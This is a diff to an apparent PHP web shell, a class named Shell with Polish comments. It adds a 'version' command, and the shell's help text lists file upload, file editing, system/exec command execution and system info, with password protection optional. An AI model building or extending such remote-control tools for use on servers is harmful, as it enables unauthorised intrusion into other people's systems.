@@ -37,7 +37,7 @@ class Shell
 	/**
 	 * Help, natywne polecenia
 	 */
-	const HELP = "help - Wyświetlanie pomocy\r\nmodules - Informacje o modułach\r\nedit - Edycja oraz tworzenie nowego pliku\r\nupload - Wrzucanie pliku na serwer\r\nsystem, exec - Uruchomienie polecenia systemowego\r\ninfo - Wyświetla informacje o systemie\r\nautoload - Automatyczne wczytywanie rozszerzeń PHP\r\nlogout - Wylogowanie";
+	const HELP = "help - Wyświetlanie pomocy\r\nmodules - Informacje o modułach\r\nedit - Edycja oraz tworzenie nowego pliku\r\nupload - Wrzucanie pliku na serwer\r\nsystem, exec - Uruchomienie polecenia systemowego\r\ninfo - Wyświetla informacje o systemie\r\nautoload - Automatyczne wczytywanie rozszerzeń PHP\r\nversion - Wyświetlanie numeru wersji shell'a\r\nlogout - Wylogowanie";
 
 	/**
 	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
@@ -1268,6 +1268,31 @@ DATA;
 	}
 
 	/**
+	 * Version
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandVersion()
+	{
+		/**
+		 * Help
+		 */
+		if( $this -> bHelp )
+		{
+			return <<<DATA
+version - Wyświetlanie numeru wersji shell'a
+
+	Użycie:
+		version
+DATA;
+		}
+
+		return self::VERSION;
+
+	}
+
+	/**
 	 * Wrzucanie pliku
 	 *
 	 * @access private
@@ -1471,6 +1496,9 @@ DATA;
 					break ;
 				case 'autoload':
 					$sConsole = $this -> getCommandAutoload();
+					break ;
+				case 'version':
+					$sConsole = $this -> getCommandVersion();
 					break ;
 				case 'logout':
 					$sConsole = $this -> getCommandLogout();
